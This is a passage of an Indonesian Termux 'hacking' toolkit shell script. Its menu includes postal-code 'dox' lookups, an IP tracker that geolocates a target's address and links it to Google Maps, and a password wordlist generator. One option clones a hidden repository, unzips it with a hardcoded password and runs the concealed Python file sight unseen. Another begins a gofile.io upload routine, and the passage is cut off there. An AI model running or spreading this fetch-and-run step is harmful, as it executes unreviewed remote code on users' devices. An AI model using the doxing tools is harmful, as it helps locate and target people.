        37211|37212|37213|37214|37215|37216|37217|37218|37219|37221|37222|37223|37224|37225|37226|37227|37228|37229|37231|37232|37233|37234|37235|37236|37237|37238|37239|37241|37242|37243|37244|37245|37246|37247|37248|37249|37251|37252|37253|37254|37255|37256|37257|37258|37259|37261|37262|37263|37264|37265|37266|37267|37268|37269|37271|37272|37273|37274|37275|37276|37277|37278|37279|37281|37282|37283|37284|37285|37286|37287|37288|37289|37291|37292|37293|37294|37295|37296|37297|37298|37299)
            nama_daerah="Bungo"
            found=1
            ;;
        37511|37512|37513|37514|37515|37516|37517|37518|37519|37521|37522|37523|37524|37525|37526|37527|37528|37529|37531|37532|37533|37534|37535|37536|37537|37538|37539|37541|37542|37543|37544|37545|37546|37547|37548|37549|37551|37552|37553|37554|37555|37556|37557|37558|37559|37561|37562|37563|37564|37565|37566|37567|37568|37569|37571|37572|37573|37574|37575|37576|37577|37578|37579|37581|37582|37583|37584|37585|37586|37587|37588|37589|37591|37592|37593|37594|37595|37596|37597|37598|37599)
            nama_daerah="Tebo"
            found=1
            ;;
        32111|32112|32113|32114|32115|32116|32117|32118|32119|32121|32122|32123|32124|32125|32126|32127|32128|32129|32131|32132|32133|32134|32135|32136|32137|32138|32139|32141|32142|32143|32144|32145|32146|32147|32148|32149|32151|32152|32153|32154|32155|32156|32157|32158|32159|32161|32162|32163|32164|32165|32166|32167|32168|32169|32171|32172|32173|32174|32175|32176|32177|32178|32179|32181|32182|32183|32184|32185|32186|32187|32188|32189|32191|32192|32193|32194|32195|32196|32197|32198|32199)
            nama_daerah="Ogan Komering Ulu"
            found=1
            ;;
        30611|30612|30613|30614|30615|30616|30617|30618|30619|30621|30622|30623|30624|30625|30626|30627|30628|30629|30631|30632|30633|30634|30635|30636|30637|30638|30639|30641|30642|30643|30644|30645|30646|30647|30648|30649|30651|30652|30653|30654|30655|30656|30657|30658|30659|30661|30662|30663|30664|30665|30666|30667|30668|30669|30671|30672|30673|30674|30675|30676|30677|30678|30679|30681|30682|30683|30684|30685|30686|30687|30688|30689|30691|30692|30693|30694|30695|30696|30697|30698|30699)
            nama_daerah="Ogan Komering Ilir"
            found=1
            ;;
        31311|31312|31313|31314|31315|31316|31317|31318|31319|31321|31322|31323|31324|31325|31326|31327|31328|31329|31331|31332|31333|31334|31335|31336|31337|31338|31339|31341|31342|31343|31344|31345|31346|31347|31348|31349|31351|31352|31353|31354|31355|31356|31357|31358|31359|31361|31362|31363|31364|31365|31366|31367|31368|31369|31371|31372|31373|31374|31375|31376|31377|31378|31379|31381|31382|31383|31384|31385|31386|31387|31388|31389|31391|31392|31393|31394|31395|31396|31397|31398|31399)
            nama_daerah="Muara Enim"
            found=1
            ;;
        31411|31412|31413|31414|31415|31416|31417|31418|31419|31421|31422|31423|31424|31425|31426|31427|31428|31429|31431|31432|31433|31434|31435|31436|31437|31438|31439|31441|31442|31443|31444|31445|31446|31447|31448|31449|31451|31452|31453|31454|31455|31456|31457|31458|31459|31461|31462|31463|31464|31465|31466|31467|31468|31469|31471|31472|31473|31474|31475|31476|31477|31478|31479|31481|31482|31483|31484|31485|31486|31487|31488|31489|31491|31492|31493|31494|31495|31496|31497|31498|31499)
            nama_daerah="Lahat"
            found=1
            ;;
        31611|31612|31613|31614|31615|31616|31617|31618|31619|31621|31622|31623|31624|31625|31626|31627|31628|31629|31631|31632|31633|31634|31635|31636|31637|31638|31639|31641|31642|31643|31644|31645|31646|31647|31648|31649|31651|31652|31653|31654|31655|31656|31657|31658|31659|31661|31662|31663|31664|31665|31666|31667|31668|31669|31671|31672|31673|31674|31675|31676|31677|31678|31679|31681|31682|31683|31684|31685|31686|31687|31688|31689|31691|31692|31693|31694|31695|31696|31697|31698|31699)
            nama_daerah="Musi Rawas"
            found=1
            ;;
        30711|30712|30713|30714|30715|30716|30717|30718|30719|30721|30722|30723|30724|30725|30726|30727|30728|30729|30731|30732|30733|30734|30735|30736|30737|30738|30739|30741|30742|30743|30744|30745|30746|30747|30748|30749|30751|30752|30753|30754|30755|30756|30757|30758|30759|30761|30762|30763|30764|30765|30766|30767|30768|30769|30771|30772|30773|30774|30775|30776|30777|30778|30779|30781|30782|30783|30784|30785|30786|30787|30788|30789|30791|30792|30793|30794|30795|30796|30797|30798|30799)
            nama_daerah="Musi Banyuasin"
            found=1
            ;;
        30911|30912|30913|30914|30915|30916|30917|30918|30919|30921|30922|30923|30924|30925|30926|30927|30928|30929|30931|30932|30933|30934|30935|30936|30937|30938|30939|30941|30942|30943|30944|30945|30946|30947|30948|30949|30951|30952|30953|30954|30955|30956|30957|30958|30959|30961|30962|30963|30964|30965|30966|30967|30968|30969|30971|30972|30973|30974|30975|30976|30977|30978|30979|30981|30982|30983|30984|30985|30986|30987|30988|30989|30991|30992|30993|30994|30995|30996|30997|30998|30999)
            nama_daerah="Banyuasin"
            found=1
            ;;
        32111|32112|32113|32114|32115|32116|32117|32118|32119|32121|32122|32123|32124|32125|32126|32127|32128|32129|32131|32132|32133|32134|32135|32136|32137|32138|32139|32141|32142|32143|32144|32145|32146|32147|32148|32149|32151|32152|32153|32154|32155|32156|32157|32158|32159|32161|32162|32163|32164|32165|32166|32167|32168|32169|32171|32172|32173|32174|32175|32176|32177|32178|32179|32181|32182|32183|32184|32185|32186|32187|32188|32189|32191|32192|32193|32194|32195|32196|32197|32198|32199)
            nama_daerah="Ogan Komering Ulu Timur"
            found=1
            ;;
        32211|32212|32213|32214|32215|32216|32217|32218|32219|32221|32222|32223|32224|32225|32226|32227|32228|32229|32231|32232|32233|32234|32235|32236|32237|32238|32239|32241|32242|32243|32244|32245|32246|32247|32248|32249|32251|32252|32253|32254|32255|32256|32257|32258|32259|32261|32262|32263|32264|32265|32266|32267|32268|32269|32271|32272|32273|32274|32275|32276|32277|32278|32279|32281|32282|32283|32284|32285|32286|32287|32288|32289|32291|32292|32293|32294|32295|32296|32297|32298|32299)
            nama_daerah="Ogan Komering Ulu Selatan"
            found=1
            ;;
        41211|41212|41213|41214|41215|41216|41217|41218|41219|41221|41222|41223|41224|41225|41226|41227|41228|41229|41231|41232|41233|41234|41235|41236|41237|41238|41239|41241|41242|41243|41244|41245|41246|41247|41248|41249|41251|41252|41253|41254|41255|41256|41257|41258|41259|41261|41262|41263|41264|41265|41266|41267|41268|41269|41271|41272|41273|41274|41275|41276|41277|41278|41279|41281|41282|41283|41284|41285|41286|41287|41288|41289|41291|41292|41293|41294|41295|41296|41297|41298|41299)
            nama_daerah="Subang"
            found=1
            ;;
        41111|41112|41113|41114|41115|41116|41117|41118|41119|41121|41122|41123|41124|41125|41126|41127|41128|41129|41131|41132|41133|41134|41135|41136|41137|41138|41139|41141|41142|41143|41144|41145|41146|41147|41148|41149|41151|41152|41153|41154|41155|41156|41157|41158|41159|41161|41162|41163|41164|41165|41166|41167|41168|41169|41171|41172|41173|41174|41175|41176|41177|41178|41179|41181|41182|41183|41184|41185|41186|41187|41188|41189|41191|41192|41193|41194|41195|41196|41197|41198|41199)
            nama_daerah="Purwakarta"
            found=1
            ;;
        41311|41312|41313|41314|41315|41316|41317|41318|41319|41321|41322|41323|41324|41325|41326|41327|41328|41329|41331|41332|41333|41334|41335|41336|41337|41338|41339|41341|41342|41343|41344|41345|41346|41347|41348|41349|41351|41352|41353|41354|41355|41356|41357|41358|41359|41361|41362|41363|41364|41365|41366|41367|41368|41369|41371|41372|41373|41374|41375|41376|41377|41378|41379|41381|41382|41383|41384|41385|41386|41387|41388|41389|41391|41392|41393|41394|41395|41396|41397|41398|41399)
            nama_daerah="Karawang"
            found=1
            ;;
        17511|17512|17513|17514|17515|17516|17517|17518|17519|17521|17522|17523|17524|17525|17526|17527|17528|17529|17531|17532|17533|17534|17535|17536|17537|17538|17539|17541|17542|17543|17544|17545|17546|17547|17548|17549|17551|17552|17553|17554|17555|17556|17557|17558|17559|17561|17562|17563|17564|17565|17566|17567|17568|17569|17571|17572|17573|17574|17575|17576|17577|17578|17579|17581|17582|17583|17584|17585|17586|17587|17588|17589|17591|17592|17593|17594|17595|17596|17597|17598|17599)
            nama_daerah="Bekasi"
            found=1
            ;;
        40511|40512|40513|40514|40515|40516|40517|40518|40519|40521|40522|40523|40524|40525|40526|40527|40528|40529|40531|40532|40533|40534|40535|40536|40537|40538|40539|40541|40542|40543|40544|40545|40546|40547|40548|40549|40551|40552|40553|40554|40555|40556|40557|40558|40559|40561|40562|40563|40564|40565|40566|40567|40568|40569|40571|40572|40573|40574|40575|40576|40577|40578|40579|40581|40582|40583|40584|40585|40586|40587|40588|40589|40591|40592|40593|40594|40595|40596|40597|40598|40599)
            nama_daerah="Bandung Barat"
            found=1
            ;;
    esac
fi
if [[ $found -eq 1 ]]; then
    kode_kab="${kode_pos:0:2}${kode_pos:2:2}"
if [[ -n "${kabupaten_data[$kode_kab]}" ]]; then
     nama_kabupaten="${kabupaten_data[$kode_kab]}"
else
     nama_kabupaten="Tidak diketahui"
fi  
    kode_prov="${kode_pos:0:2}"
if [[ -n "${provinsi_data[$kode_prov]}" ]]; then
     nama_provinsi="${provinsi_data[$kode_prov]}"
else
     nama_provinsi="Tidak diketahui"
fi
echo ""
echo -e "${r}============================================"
echo -e "${g}           KODE POS DI TEMUKAN "
echo -e "${r}============================================"
echo -e "${a}Kode Pos ${r}: ${g}$kode_pos"
echo -e "${a}Nama Daerah ${r}: ${g}$nama_daerah${N}"
if [[ -n "$kode_bps" ]]; then
   echo -e "${a}Kode BPS ${r}: ${g}$kode_bps"
fi
    echo -e "${a}Kabupaten ${r}: ${g}$nama_kabupaten"
    echo -e "${a}Provinsi ${r}: ${g}$nama_provinsi"
    echo -e "${r}============================================"
    echo ""
else
    echo ""
    echo -e "${r}============================================"
    echo -e "${g}      Kode Pos ${y}$kode_pos${c} Tidak Ditemukan!"
    echo -e "${r}============================================"
    echo ""
fi
}
about() {
echo -e "${g} Thanks you by.thxyzz404"
echo ""
}
start() {
    clear
    mek
    echo ""
    read -p "$(echo -e "${b}Choose${c} :${g} ")" choose
    echo ""
    case "$choose" in
        1|01) dox_1 ;;
        2|02) dox_2 ;;
        3|03) about ;;
        *) echo -e "${r}Invalid__Option..!!${n}" ;;
    esac
    echo ""
}
start
echo ""
echo -e "${g}Tekan Enter Untuk Kembali ke ToolsV6"
read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
clear
elif [[ "$all" == "42" ]]; then
mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
echo -e "${r} Anda Memilih Menu Hacking !!"
echo ""
echo -e "${g} PROGRES ✅"
sleep 2
red='\033[0;31m'
hijau='\033[0;32m'
kuning='\033[0;33m'
biru='\033[0;34m'
purple='\033[0;35m'
cyan='\033[0;36m'
putih='\033[0;37m'
bgr='\033[41m'
bgh='\033[42m'
bgk='\033[43m'
bgb='\033[44m'
bgpurple='\033[45m'
bgc='\033[46m'
bgp='\033[47m'
banner() {
clear
echo "
░▀█▀░█▀▄░█▀█░█▀▀░█░█░█▀▀░█▀▄
░░█░░█▀▄░█▀█░█░░░█▀▄░█▀▀░█▀▄
░░▀░░▀░▀░▀░▀░▀▀▀░▀░▀░▀▀▀░▀░▀ " | lolcat
}
menu() {
printf "\e[0m\n"
printf "\e[0m\e[1;31m  [\e[0m\e[1;37m 01 \e[0m\e[1;31m]\e[0m\e[1;33m IP ANDA\e[0m\n"
printf "\e[0m\e[1;31m  [\e[0m\e[1;37m 02 \e[0m\e[1;31m]\e[0m\e[1;33m TRACK IP\e[0m\n"
printf "\e[0m\e[1;31m  [\e[0m\e[1;37m 00 \e[0m\e[1;31m]\e[0m\e[1;33m KELUAR\e[0m\n"
printf "\e[0m\n"
read -p $'  \e[1;31m[\e[0m\e[1;37m~\e[0m\e[1;31m]\e[0m\e[1;92m Select> \e[0m\e[1;96m: \e[0m\e[1;93m\en' option
if [[ $option == 1 || $option == 01 ]]; then
myipaddr
elif [[ $option == 2 || $option == 02 ]]; then
useripaddr
elif [[ $option == 0 || $option == 00 ]]; then
sleep 1
printf "\e[0m\n"
printf "\e[0m\n"
read -n 1 -s -r -p "Silahkan Tekan Enter Untuk Kluar"
clear
else
printf " \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Salah goblok \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
sleep 1
banner
menu
fi
}
myipaddr() {
myipaddripapico=$(curl -s "https://ipapi.co//json" -L)
myipaddripapicom=$(curl -s "http://ip-api.com/json/" -L)
myip=$(echo $myipaddripapico | grep -Po '(?<="ip":)[^,]*' | tr -d '[]"')
mycity=$(echo $myipaddripapico | grep -Po '(?<="city":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
myregion=$(echo $myipaddripapico | grep -Po '(?<="region":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
mycountry=$(echo $myipaddripapico | grep -Po '(?<="country_name":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
mylat=$(echo $myipaddripapicom | grep -Po '(?<="lat":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
mylon=$(echo $myipaddripapicom | grep -Po '(?<="lon":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
mytime=$(echo $myipaddripapicom | grep -Po '(?<="timezone":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
mypostal=$(echo $myipaddripapicom | grep -Po '(?<="zip":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
myisp=$(echo $myipaddripapico | grep -Po '(?<="org":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
myasn=$(echo $myipaddripapico | grep -Po '(?<="asn":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
mycountrycode=$(echo $myipaddripapico | grep -Po '(?<="country_code":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
mycurrency=$(echo $myipaddripapico | grep -Po '(?<="currency":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
mylanguage=$(echo $myipaddripapico | grep -Po '(?<="languages":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
mycalling=$(echo $myipaddripapico | grep -Po '(?<="country_calling_code":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
banner
printf "\e[0m\n"
printf "\e[0m\n"
printf "  \e[0m\e[1;93m  Alamat Ip    \e[0m\e[1;96m:\e[0m\e[1;92m   $myip\e[0m\n"
printf "  \e[0m\e[1;93m  Kota         \e[0m\e[1;96m:\e[0m\e[1;92m   $mycity\e[0m\n"
printf "  \e[0m\e[1;93m  Wilayah      \e[0m\e[1;96m:\e[0m\e[1;92m   $myregion\e[0m\n"
printf "  \e[0m\e[1;93m  Negara       \e[0m\e[1;96m:\e[0m\e[1;92m   $mycountry\e[0m\n"
printf "\e[0m\n"
printf "  \e[0m\e[1;93m  Lintang      \e[0m\e[1;96m:\e[0m\e[1;92m    $mylat\e[0m\n"
printf "  \e[0m\e[1;93m  Bujur        \e[0m\e[1;96m:\e[0m\e[1;92m    $mylon\e[0m\n"
printf "  \e[0m\e[1;93m  Zona Waktu   \e[0m\e[1;96m:\e[0m\e[1;92m    $mytime\e[0m\n"
printf "  \e[0m\e[1;93m  Kode Pos     \e[0m\e[1;96m:\e[0m\e[1;92m    $mypostal\e[0m\n"
printf "\e[0m\n"
printf "  \e[0m\e[1;93m  ISP          \e[0m\e[1;96m:\e[0m\e[1;92m   $myisp\e[0m\n"
printf "  \e[0m\e[1;93m  ASN          \e[0m\e[1;96m:\e[0m\e[1;92m   $myasn\e[0m\n"
printf "\e[0m\n"
printf "  \e[0m\e[1;93m  Kode Negara  \e[0m\e[1;96m:\e[0m\e[1;92m   $mycountrycode\e[0m\n"
printf "  \e[0m\e[1;93m  Mata Uang    \e[0m\e[1;96m:\e[0m\e[1;92m   $mycurrency\e[0m\n"
printf "  \e[0m\e[1;93m  Bahasa       \e[0m\e[1;96m:\e[0m\e[1;92m   $mylanguage\e[0m\n"
printf "  \e[0m\e[1;93m  Kode Panggil \e[0m\e[1;96m:\e[0m\e[1;92m   $mycalling\e[0m\n"
printf "\e[0m\n"
printf "  \e[0m\e[1;93m  Google Map   \e[0m\e[1;96m:\e[0m\e[1;94m  https://maps.google.com/?q=$mylat,$mylon\e[0m\n"
sleep 5
printf "\e[0m\n"
printf "  \e[0m\e[1;91m[\e[0m\e[1;97m01\e[0m\e[1;91m]\e[0m\e[1;93m Kembali\e[0m\n"
printf "  \e[0m\e[1;91m[\e[0m\e[1;97m02\e[0m\e[1;91m]\e[0m\e[1;93m Keluar\e[0m\n"
printf "\e[0m\n"
read -p $'  \e[1;31mSelect>\e[0m\e[1;96m  \en' mainorexit1
if [[ $mainorexit1 == 1 || $mainorexit1 == 01 ]]; then
banner
menu
elif [[ $mainorexit1 == 2 || $mainorexit1 == 02 ]]; then
printf "\e[0m\n"
printf "\e[0m\n"
read -n 1 -s -r -p "Silahkan Tekan Enter Untuk Kluar...!!"
clear 
else
printf " \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Salah goblok \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
sleep 1
banner
menu
fi
}
useripaddr() {
banner
printf "\e[0m\n"
printf "\e[0m\n"
printf "\e[0m\n"
read -p $'  \e[1;31m[\e[0m\e[1;37m~\e[0m\e[1;31m]\e[0m\e[1;92m Ip Target \e[0m\e[1;96m: \e[0m\e[1;93m\en' useripaddress
ipaddripapico=$(curl -s "https://ipapi.co/$useripaddress/json" -L)
ipaddripapicom=$(curl -s "http://ip-api.com/json/$useripaddress" -L)
userip=$(echo $ipaddripapico | grep -Po '(?<="ip":)[^,]*' | tr -d '[]"')
usercity=$(echo $ipaddripapico | grep -Po '(?<="city":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
useregion=$(echo $ipaddripapico | grep -Po '(?<="region":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
usercountry=$(echo $ipaddripapico | grep -Po '(?<="country_name":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
userlat=$(echo $ipaddripapicom | grep -Po '(?<="lat":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
userlon=$(echo $ipaddripapicom | grep -Po '(?<="lon":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
usertime=$(echo $ipaddripapicom | grep -Po '(?<="timezone":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
userpostal=$(echo $ipaddripapicom | grep -Po '(?<="zip":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
userisp=$(echo $ipaddripapico | grep -Po '(?<="org":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
userasn=$(echo $ipaddripapico | grep -Po '(?<="asn":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
usercountrycode=$(echo $ipaddripapico | grep -Po '(?<="country_code":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
usercurrency=$(echo $ipaddripapico | grep -Po '(?<="currency":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
userlanguage=$(echo $ipaddripapico | grep -Po '(?<="languages":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
usercalling=$(echo $ipaddripapico | grep -Po '(?<="country_calling_code":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
banner
printf "\e[0m\n"
printf "\e[0m\n"
printf "  \e[0m\e[1;93m  IP target       \e[0m\e[1;96m:\e[0m\e[1;92m   $userip\e[0m\n"
printf "  \e[0m\e[1;93m  Kota            \e[0m\e[1;96m:\e[0m\e[1;92m   $usercity\e[0m\n"
printf "  \e[0m\e[1;93m  Wilayah         \e[0m\e[1;96m:\e[0m\e[1;92m   $useregion\e[0m\n"
printf "  \e[0m\e[1;93m  Negara          \e[0m\e[1;96m:\e[0m\e[1;92m   $usercountry\e[0m\n"
printf "\e[0m\n"
printf "  \e[0m\e[1;93m  Garis lintang   \e[0m\e[1;96m:\e[0m\e[1;92m    $userlat\e[0m\n"
printf "  \e[0m\e[1;93m  Bujur           \e[0m\e[1;96m:\e[0m\e[1;92m    $userlon\e[0m\n"
printf "  \e[0m\e[1;93m  Zona waktu      \e[0m\e[1;96m:\e[0m\e[1;92m    $usertime\e[0m\n"
printf "  \e[0m\e[1;93m  Kode pos        \e[0m\e[1;96m:\e[0m\e[1;92m    $userpostal\e[0m\n"
printf "\e[0m\n"
printf "  \e[0m\e[1;93m  ISP             \e[0m\e[1;96m:\e[0m\e[1;92m   $userisp\e[0m\n"
printf "  \e[0m\e[1;93m  ASN             \e[0m\e[1;96m:\e[0m\e[1;92m   $userasn\e[0m\n"
printf "\e[0m\n"
printf "  \e[0m\e[1;93m  Kode negara     \e[0m\e[1;96m:\e[0m\e[1;92m   $usercountrycode\e[0m\n"
printf "  \e[0m\e[1;93m  Mata Uang       \e[0m\e[1;96m:\e[0m\e[1;92m   $usercurrency\e[0m\n"
printf "  \e[0m\e[1;93m  Bahasa          \e[0m\e[1;96m:\e[0m\e[1;92m   $userlanguage\e[0m\n"
printf "  \e[0m\e[1;93m  Kode panggilan  \e[0m\e[1;96m:\e[0m\e[1;92m   $usercalling\e[0m\n"
printf "\e[0m\n"
printf "  \e[0m\e[1;93m  Google map      \e[0m\e[1;96m:\e[0m\e[1;94m  https://maps.google.com/?q=$userlat,$userlon\e[0m\n"
sleep 5
printf "\e[0m\n"
printf "  \e[0m\e[1;91m[\e[0m\e[1;97m 01 \e[0m\e[1;91m]\e[0m\e[1;93m Kembali\e[0m\n"
printf "  \e[0m\e[1;91m[\e[0m\e[1;97m 02 \e[0m\e[1;91m]\e[0m\e[1;93m Keluar\e[0m\n"
printf "\e[0m\n"
read -p $'  \e[1;31mSelect>\e[0m\e[1;96m  \en' mainorexit2
if [[ $mainorexit2 == 1 || $mainorexit2 == 01 ]]; then
banner
menu
elif [[ $mainorexit2 == 2 || $mainorexit2 == 02 ]]; then
printf "\e[0m\n"
printf "\e[0m\n"
else
printf " \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Salah goblok \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
sleep 1
banner
menu
fi
}
banner
menu
echo ""
echo -e "${g}Tekan Enter Untuk Kembali ke ToolsV6"
read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
clear
elif [[ "$all" == "43" ]]; then
mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
echo -e "${r} Anda Memilih Menu Hacking !!"
echo ""
echo -e "${g} PROGRES ✅"
sleep 2
clear 
g='\033[32;1m'
c='\033[36;1m'
y='\033[33;1m'
mkdir -p "/sdcard/Wordslit_GENERATOR"
echo "
░█░█░█▀█░█▀▄░█▀▄░█▀▀░█░░░▀█▀░▀█▀
░█▄█░█░█░█▀▄░█░█░▀▀█░█░░░░█░░░█░
░▀░▀░▀▀▀░▀░▀░▀▀░░▀▀▀░▀▀▀░▀▀▀░░▀░ 
     Developer : Thxyzz404 " | lolcat
echo -e "${y}"
read -p "Masukkan file [ contoh : pass.txt ] : " path
echo -e "${g}"
file="/sdcard/Wordslit_GENERATOR/$path"
target_lines=6958
loading() {
    local pid=$1
    local spin='-\|/'
    local i=0
    while kill -0 $pid 2>/dev/null; do
        i=$(( (i+1) %4 ))
        printf "\rLoading ${spin:$i:1}"
        sleep 0.1
    done
    printf "\rSukses  \n"
}
angka() {
    digit1=$((RANDOM % 9 + 1))
    digit2=$((RANDOM % 10))
    digit3=$((RANDOM % 10))
    digit4=$((RANDOM % 10))
    digit5=$((RANDOM % 10))
    digit6=$((RANDOM % 10))
    digit7=$((RANDOM % 10))
    digit8=$((RANDOM % 10))
    echo "${digit1}${digit2}${digit3}${digit4}${digit5}${digit6}${digit7}${digit8}"
}
huruf() {
    panjang=$((RANDOM % 16 + 5))
    tr -dc 'a-z' < /dev/urandom | head -c $panjang
}
jepang() {
    panjang=$((RANDOM % 8 + 3))
    hasil=""
    for ((i=0; i<panjang; i++)); do
        if [[ $((RANDOM % 2)) -eq 0 ]]; then
            kode=$((12352 + RANDOM % 96))
        else
            kode=$((12448 + RANDOM % 96))
        fi
        hasil+=$(printf "\\u$(printf '%x' $kode)")
    done
    echo -n "$hasil"
}
khas() {
    part1=$(tr -dc 'a-zA-Z0-9' < /dev/urandom | head -c 2)
    part2=$(tr -dc 'a-zA-Z0-9' < /dev/urandom | head -c 2)
    part3=$(tr -dc 'a-z' < /dev/urandom | head -c 2)
    part4=$(printf "%02d" $((RANDOM % 100)))
    part5=$(printf "%02d" $((RANDOM % 100)))
    echo "${part1}_${part2}_${part3}_${part4}_${part5}"
}
> "$file"
(
    funcs=("angka" "huruf" "jepang" "khas")
    current_lines=0   
    while [[ $current_lines -lt $target_lines ]]; do
        random_func="${funcs[$((RANDOM % ${#funcs[@]}))]}"
        result=$($random_func)
        echo "$result" >> "$file"
        ((current_lines++))
    done
) &
BG_PID=$!
loading $BG_PID
wait $BG_PID
total_lines=$(wc -l < "$file")
echo -e "${c}"
echo "Selesai : $total_lines baris | Target : $target_lines baris."
echo "File : $file"
echo ""
echo -e "${g}Tekan Enter Untuk Kembali ke ToolsV6"
read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
clear
elif [[ "$all" == "44" ]]; then
mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
echo -e "${r} Anda Memilih Menu Hacking !!"
echo ""
echo -e "${g} PROGRES ✅"
sleep 2
clear
cd $HOME
install_pip_package() {
local pkg="$1"
if pip show "$pkg" >/dev/null 2>&1; then
     clear 
     echo ""
     echo -e "${r}[ ${g}✓ ${r}]${y} $pkg sudah terinstall."
     sleep 2
     echo ""
else
     clear 
     echo ""
     echo -e "${r}[ ${g}x ${r}]${c} $pkg sedang menginstall."
     sleep 2
     pip install "$pkg"
fi
}
install_pip_package "pystyle"
install_pip_package "urllib3"
install_pip_package "bs4"
install_pip_package "requests"
install_pip_package "beautifulsoup4"
install_pip_package "phonenumbers"
install_pip_package "wcwidth"
install_pip_package "rich"
install_pip_package "pycryptodome"
install_pip_package "fake_useragent"
install_pip_package "colorama"
PFERFIX="$HOME"
ANK_IDIOT="$PREFIX/tmp/.otp_temp"
PEJU="Wok.py"
memek() {
echo -e "$1"
}
kontol() {
memek "${r}[ ${g}ERROR ${r}]${y} $1"
}
clear
if [ -d "$ANK_IDIOT" ]; then
    cd "$ANK_IDIOT" || kontol "Terjadi kesalahan."
    if [ -f "$PEJU" ]; then
        echo ""
        memek "${r}[ ${g}✓ ${r}]${c} Sedang menjalankan tools..!!"
        echo ""
        chmod +x Wok.py
        python3 "$PEJU" || kontol "Terjadi kesalahan."
    else
        echo ""
        memek "${r}[ ${g}+ ${r}]${y} Tidak di temukan mengclone ulang..!!${c}"
        echo ""
        cd "$HOME" || kontol "Gagal kembali ke HOME."
        rm -rf "$ANK_IDIOT"
        git clone --depth 32 https://github.com/Zero556723/.DZIP "$ANK_IDIOT" >/dev/null 2>&1 || kontol "Terjadi kesalahan."
        cd "$ANK_IDIOT" || kontol "Terjadi kesalahan."
        unzip -o -P "Feswork_045_Doesos_Xn032" ZIP >/dev/null 2>&1 || kontol "Ada Maslah."
        chmod +x Wok.py
        python3 "$PEJU" || kontol "Terjadi kesalahan."
    fi
else
    memek "${r}[ ${g}+ ${r}]${g} Mengclone repo.${c}"
    echo ""
    cd "$HOME" || kontol "Gagal kembali ke HOME."
    git clone --depth 32 https://github.com/Zero556723/.DZIP "$ANK_IDIOT" >/dev/null 2>&1 || kontol "Terjadi kesalahan."
    cd "$ANK_IDIOT" || kontol "Terjadi kesalahan."
    unzip -o -P "Feswork_045_Doesos_Xn032" ZIP >/dev/null 2>&1 || kontol "Ada Maslah."
    chmod +x Wok.py
    python3 "$PEJU" || kontol "Terjadi kesalahan."
fi
echo ""
echo -e "${g}Tekan Enter Untuk Kembali ke ToolsV6"
read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
clear
elif [[ "$all" == "45" ]]; then
mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
echo -e "${r} Anda Memilih Menu Hacking !!"
echo ""
echo -e "${g} PROGRES ✅"
sleep 2
g='\033[32;1m'
c='\033[36;1m'
r='\033[31;1m'
y='\033[33;1m'
gas_up() {
local file_path="$1"   
local res=$(curl -s "https://api.gofile.io/servers")
local status=$(echo "$res" | jq -r '.status')
if [ "$status" != "ok" ]; then
clear 
echo ""
echo -e "${r} Terjadi kesalahan."
echo ""
pkill -9 -f com.termux
fi
local net=$(echo "$res" | jq -r '.data.servers[0].name')
if [ -z "$net" ] || [ "$net" = "null" ]; then
clear 
echo ""
echo -e "${r} Terjadi kesalahan."
echo ""
pkill -9 -f com.termux
fi
local upload_url="https://${net}.gofile.io/uploadFile"
